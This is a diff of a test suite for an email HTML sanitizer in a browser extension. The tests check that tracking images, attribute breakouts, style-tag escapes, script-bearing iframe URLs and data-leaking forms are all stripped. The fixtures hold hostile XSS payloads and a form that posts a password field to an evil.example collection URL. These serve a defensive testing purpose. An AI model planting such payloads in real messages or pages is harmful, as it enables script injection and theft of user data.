@@ -1,10 +1,32 @@
-import { describe, expect, test } from 'bun:test';
+import { afterAll, describe, expect, mock, test } from 'bun:test';
+import { readFileSync } from 'node:fs';
+import { join } from 'node:path';
 import {
+  DEFAULT_HTML_RENDERING_SETTINGS,
   escapeHtmlText,
+  htmlToPlainText,
   initSanitize,
   sanitizeHtml,
   sanitizeStyleBlockCss,
-} from '@/utils/sanitize-html.js';
+  saveHtmlRenderingSettings,
+} from '@/utils/email/sanitize-html.js';
+import { PROJECT_ROOT } from '../helpers/project-root.js';
+
+afterAll(() => mock.restore());
+const storedSettings: Record<string, unknown> = {};
+mock.module('wxt/browser', () => ({
+  browser: {
+    storage: {
+      local: {
+        get: async () => ({ ...storedSettings }),
+        set: async (values: Record<string, unknown>) => {
+          Object.assign(storedSettings, values);
+        },
+      },
+      onChanged: { addListener: () => {} },
+    },
+  },
+}));
 
 describe('escapeHtmlText', () => {
   test('escapes plain text before it is wrapped in HTML containers', () => {
@@ -16,13 +38,18 @@ describe('escapeHtmlText', () => {
 
 describe('sanitizeHtml', () => {
   test('strips HTML tags when DOMPurify is not yet loaded', () => {
-    const raw = '<p>Hello <strong>World</strong> <script>alert(1)</script></p>';
+    const raw =
+      '<p style="background-image:image-set(\'https://evil.example/track.png\' 1x)">Hello <strong>World</strong></p>' +
+      '<style>.x { background: url(https://evil.example/block.png); }</style>' +
+      '<script>alert(1)</script>';
     // Since DOMPurify is not loaded, it falls back to tag stripping regex
     const sanitized = sanitizeHtml(raw);
     expect(sanitized).toContain('Hello World');
-    // Script/style bodies are removed entirely — they must never leak as text
+    // Script/style bodies are removed entirely - they must never leak as text
     expect(sanitized).not.toContain('alert(1)');
     expect(sanitized).not.toContain('<p>');
+    expect(sanitized).not.toContain('evil.example');
+    expect(sanitized).not.toContain('style=');
   });
 
   describe('with DOMPurify loaded', () => {
@@ -41,11 +68,84 @@ describe('sanitizeHtml', () => {
       expect(sanitizedRawAmp).toContain('src="https://example.org/logo2.png"');
     });
 
+    test('refuses to unblock a proxy URL whose decoded payload breaks out of the attribute', () => {
+      // `%22%3E%3Cimg …` decodes to `"><img src=x onerror=…>` - the old
+      // unchecked splice closed the src attribute early and injected a second
+      // element. The rewrite must be skipped instead.
+      const raw =
+        '<img src="/res.php?r=1&amp;n=img&amp;q=https%3A%2F%2Fexample.com%2Flogo.png%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E" />';
+      const sanitized = sanitizeHtml(raw, { allowImages: true });
+      expect(sanitized).not.toMatch(/onerror\s*=/i);
+      expect((sanitized.match(/<img/gi) || []).length).toBe(1);
+    });
+
+    test('refuses to unblock a proxy URL that hides a quote behind an HTML entity', () => {
+      // The entity form of the delimiter survives the splice as literal text and
+      // is turned back into a raw quote by the entity-decode pass - which runs
+      // whenever the message also contains entity-encoded tags (the `&lt;span&gt;`
+      // here). It must therefore be rejected up front, exactly like a raw `"`.
+      const raw =
+        "<p>&lt;span&gt;hi&lt;/span&gt;</p><img src='/res.php?r=1&n=img&q=https%3A%2F%2Fexample.com%2Flogo.png%26quot%3B%3E%3Cimg%20src%3Dx%3E' />";
+      const sanitized = sanitizeHtml(raw, { allowImages: true });
+      expect((sanitized.match(/<img/gi) || []).length).toBe(1);
+      expect(sanitized).not.toMatch(/<img[^>]*src=x/i);
+    });
+
+    test('still unblocks proxy URLs that decode to a plain image URL', () => {
+      const raw =
+        '<img src="/res.php?r=1&amp;n=img&amp;q=https%3A%2F%2Fcdn.example.com%2Fa.png%3Fw%3D10%26h%3D20" />';
+      // Query-string `&` is re-escaped by the serializer - same URL, valid markup.
+      const sanitized = sanitizeHtml(raw, { allowImages: true });
+      expect(sanitized).toContain('src="https://cdn.example.com/a.png?w=10&amp;h=20"');
+    });
+
     test('strips remote images by default (privacy)', () => {
       const raw = '<p>Hi</p><img src="https://example.com/track.png" alt="x" />';
       const sanitized = sanitizeHtml(raw);
       expect(sanitized).not.toContain('<img');
       expect(sanitized).toContain('Hi');
+    });
+
+    test('strips remote CSS images from inline styles while preserving safe declarations', () => {
+      const raw = [
+        '<p style="background-image:image-set(\'https://evil.example/x.png\' 1x); color:red">x</p>',
+        '<p style="background-image:url(https://evil.example/y.png); padding:4px">y</p>',
+        '<p style="background-image:u\\72 l(\'https://evil.example/z.png\'); margin:2px">z</p>',
+      ].join('');
+
+      const sanitized = sanitizeHtml(raw);
+
+      expect(sanitized).not.toContain('evil.example');
+      expect(sanitized).toContain('color: red');
+      expect(sanitized).toContain('padding: 4px');
+      expect(sanitized).toContain('margin: 2px');
+    });
+
+    test('strips remote CSS image functions from scoped style blocks', () => {
+      const raw = `<style>
+        .set { background-image: image-set("https://evil.example/a.png" 1x); color: red; }
+        .webkit { background-image: -webkit-image-set("https://evil.example/b.png" 1x); }
+        .fade { background-image: cross-fade(url("https://evil.example/c.png"), linear-gradient(red, blue), 50%); }
+        .safe { padding: 8px; }
+      </style><p>x</p>`;
+
+      const sanitized = sanitizeHtml(raw, { allowStyleBlocks: true });
+
+      expect(sanitized).not.toContain('evil.example');
+      expect(sanitized).not.toContain('image-set');
+      expect(sanitized).not.toContain('cross-fade');
+      expect(sanitized).toContain('.set { color: red; }');
+      expect(sanitized).toContain('.safe { padding: 8px; }');
+    });
+
+    test('strips legacy remote background attributes', () => {
+      const sanitized = sanitizeHtml(
+        '<table background="https://evil.example/bg.png"><tr><td>message</td></tr></table>'
+      );
+
+      expect(sanitized).not.toContain('background=');
+      expect(sanitized).not.toContain('evil.example');
+      expect(sanitized).toContain('message');
     });
 
     test('sanitizes HTML properly after DOMPurify is loaded', () => {
@@ -55,12 +155,29 @@ describe('sanitizeHtml', () => {
       expect(sanitized).not.toContain('<script>');
     });
 
+    test('decodes entity-encoded tags even when raw HTML is also present (mixed content)', () => {
+      // Previously the decode pass was skipped whenever the message contained
+      // a raw `<`, so the encoded half rendered as literal text.
+      const raw = '<p>Raw</p>&lt;div style="color: red;"&gt;Encoded&lt;/div&gt;';
+      const sanitized = sanitizeHtml(raw);
+      expect(sanitized).toContain('<p>Raw</p>');
+      expect(sanitized).toContain('<div style="color: red;">Encoded</div>');
+    });
+
+    test('does not double-decode &amp;lt; into a raw tag', () => {
+      const raw = '<p>Escaped: &amp;lt;div&amp;gt; text</p>';
+      const sanitized = sanitizeHtml(raw);
+      // Single-level decode: `&amp;lt;` becomes literal `&lt;` text, never a tag.
+      expect(sanitized).toContain('&amp;lt;div&amp;gt; text');
+      expect(sanitized).not.toContain('<div>');
+    });
+
     test('keeps inline style attributes but strips style blocks', () => {
       const raw =
         '<div style="color: red; padding: 10px;">Content</div><style>.btn { background: blue; }</style>';
       const sanitized = sanitizeHtml(raw);
       expect(sanitized).toContain('style="color: red; padding: 10px;"');
-      // <style> would inject GLOBAL css into the extension UI — must be removed
+      // <style> would inject GLOBAL css into the extension UI - must be removed
       expect(sanitized).not.toContain('<style');
       expect(sanitized).not.toContain('.btn');
     });
@@ -75,7 +192,7 @@ describe('sanitizeHtml', () => {
       // Shadow-DOM path: sanitized block kept
       const kept = sanitizeHtml(raw, { allowStyleBlocks: true });
       expect(kept).toContain('<style>');
-      expect(kept).toContain('@media only screen and (max-width: 480px)');
+      expect(kept).toContain('@media only screen and (max-width:480px)');
       expect(kept).toContain('.info-item { display: block !important; }');
       expect(kept).toContain('Hello');
     });
@@ -214,7 +331,7 @@ describe('sanitizeStyleBlockCss', () => {
     const css =
       '@media only screen and (max-width: 480px) { .info-item { display: block !important; } .info-item { border-left: none !important; } }';
     const out = sanitizeStyleBlockCss(css);
-    expect(out).toContain('@media only screen and (max-width: 480px)');
+    expect(out).toContain('@media only screen and (max-width:480px)');
     expect(out).toContain('display: block !important');
     expect(out).toContain('border-left: none !important');
   });
@@ -241,7 +358,7 @@ describe('sanitizeStyleBlockCss', () => {
   test('keeps @supports feature queries', () => {
     const css = '@supports (display: grid) { .g { display: grid; } }';
     const out = sanitizeStyleBlockCss(css);
-    expect(out).toContain('@supports (display: grid)');
+    expect(out).toContain('@supports (display:grid)');
     expect(out).toContain('display: grid');
   });
 
@@ -277,16 +394,38 @@ describe('sanitizeStyleBlockCss', () => {
   test('darkMode neutralization also applies inside kept @media blocks', () => {
     const css = '@media (max-width: 480px) { .box { background-color: #ffffff; } }';
     const dark = sanitizeStyleBlockCss(css, { darkMode: true });
-    expect(dark).toContain('@media (max-width: 480px)');
+    expect(dark).toContain('@media (max-width:480px)');
     expect(dark).toContain('background-color: transparent');
     expect(dark).not.toContain('#ffffff');
+  });
+});
+
+describe('htmlToPlainText', () => {
+  test('strips <script> and <style> text so CSS/JS never pollutes extraction', () => {
+    const raw =
+      '<div><style>.btn { color: red; }</style>Hello <script>alert(1)</script>World</div>';
+    const text = htmlToPlainText(raw);
+    expect(text).toContain('Hello');
+    expect(text).toContain('World');
+    expect(text).not.toContain('.btn');
+    expect(text).not.toContain('alert');
+    expect(text).not.toContain('color');
+  });
+
+  test('keeps visible text between style/script blocks', () => {
+    const raw = '<style>a{}</style><p>Visible</p><script>x()</script><p>More</p>';
+    const text = htmlToPlainText(raw);
+    expect(text).toContain('Visible');
+    expect(text).toContain('More');
+    expect(text).not.toContain('a{}');
+    expect(text).not.toContain('x()');
   });
 });
 
 describe('style-block HTML breakout protection', () => {
   test('escapes </style> inside CSS strings so the tag cannot close early', () => {
     // `</style foo>` (whitespace after the name) closes a <style> element in
-    // the HTML parser but is NOT matched by the block-extraction regex — so
+    // the HTML parser but is NOT matched by the block-extraction regex - so
     // without escaping it would land as raw HTML in the shadow root.
     const raw = '<style>.x { content: "</style foo><img src=x onerror=alert(1)>bar"; }</style>';
     const sanitized = sanitizeHtml(raw, { allowStyleBlocks: true });
@@ -294,7 +433,7 @@ describe('style-block HTML breakout protection', () => {
     // `<\/style` (\/ is a CSS escape for /), so the parser never sees a close.
     expect(sanitized).toContain('<\\/style foo>');
     expect(sanitized).not.toContain('</style foo>');
-    // Exactly one real closing tag survives — the one we emit.
+    // Exactly one real closing tag survives - the one we emit.
     expect((sanitized.match(/<\/style>/gi) || []).length).toBe(1);
   });
 
@@ -305,7 +444,7 @@ describe('style-block HTML breakout protection', () => {
     expect(sanitized).toContain('<\\/style foo>');
     expect(sanitized).not.toContain('</STYLE foo>');
     // The markup stays inert CSS string text (inside the style element's raw
-    // text) — the real closing tag is emitted exactly once.
+    // text) - the real closing tag is emitted exactly once.
     expect(sanitized).toContain('<b>hi</b>');
     expect((sanitized.match(/<\/style>/gi) || []).length).toBe(1);
   });
@@ -316,5 +455,66 @@ describe('style-block HTML breakout protection', () => {
     expect(sanitized).toContain('<style>');
     expect(sanitized).toContain('.hero { padding: 12px; color: #333; }');
     expect((sanitized.match(/<\/style>/gi) || []).length).toBe(1);
+  });
+});
+
+/**
+ * The iframe / object / form rendering toggles are user opt-ins that ship OFF.
+ * Even switched ON, email content must not be able to reach a remote frame or
+ * hand data to an attacker:
+ *   • DOMPurify drops `action` / `method` / `formaction` / `name` / `value`,
+ *     so a rendered <form> has nowhere to submit and no field names to leak;
+ *   • script-bearing frame URLs (`srcdoc`, `data:`, `javascript:`) are dropped;
+ *   • a surviving remote https `src` on <iframe>/<embed> is blocked from
+ *     LOADING by the extension-page CSP - `frame-src` falls back to
+ *     `default-src 'self'` and `object-src 'none'` covers <embed>/<object>.
+ * The last test pins that CSP, because it is the layer doing the blocking for
+ * remote frames; reaching one therefore requires breaking BOTH layers.
+ */
+describe('html-rendering toggles cannot reach a remote frame or a submittable form', () => {
+  const allTagsOn = { ...DEFAULT_HTML_RENDERING_SETTINGS, iframe: true, object: true, form: true };
+
+  async function withAllTagsOn<T>(run: () => T): Promise<T> {
+    await initSanitize();
+    await saveHtmlRenderingSettings(allTagsOn);
+    try {
+      return run();
+    } finally {
+      await saveHtmlRenderingSettings({ ...DEFAULT_HTML_RENDERING_SETTINGS });
+    }
+  }
+
+  test('a form from email content keeps no destination and no field names', async () => {
+    const raw =
+      '<form action="https://evil.example/collect" method="post">' +
+      '<input type="password" name="pw" value="secret">' +
+      '<button formaction="https://evil.example/steal">Go</button></form>';
+    const sanitized = await withAllTagsOn(() => sanitizeHtml(raw));
+    expect(sanitized).toContain('<form>');
+    expect(sanitized).not.toMatch(/\b(?:action|formaction|method|name|value)\s*=/i);
+    expect(sanitized).not.toContain('evil.example');
+  });
+
+  test('script-bearing frame URLs are dropped even with iframe rendering on', async () => {
+    const raw =
+      '<iframe srcdoc="<script>alert(1)</script>"></iframe>' +
+      '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>' +
+      '<iframe src="javascript:alert(1)"></iframe>';
+    const sanitized = await withAllTagsOn(() => sanitizeHtml(raw));
+    expect(sanitized).toContain('<iframe>');
+    expect(sanitized).not.toContain('srcdoc');
+    expect(sanitized).not.toContain('data:text/html');
+    expect(sanitized).not.toContain('javascript:');
+    expect(sanitized).not.toContain('alert(1)');
+  });
+
+  test('the extension-page CSP still blocks remote frame/object loads', () => {
+    const config = readFileSync(join(PROJECT_ROOT, 'wxt.config.ts'), 'utf8');
+    expect(config).toContain('content_security_policy');
+    // frame-src (→ default-src) keeps <iframe src="https://…"> unloadable…
+    expect(config).toContain("default-src 'self'");
+    // …and object-src covers <embed>/<object>, which no frame-src can reach.
+    expect(config).toContain("object-src 'none'");
+    expect(config).toContain("script-src 'self'");
   });
 });
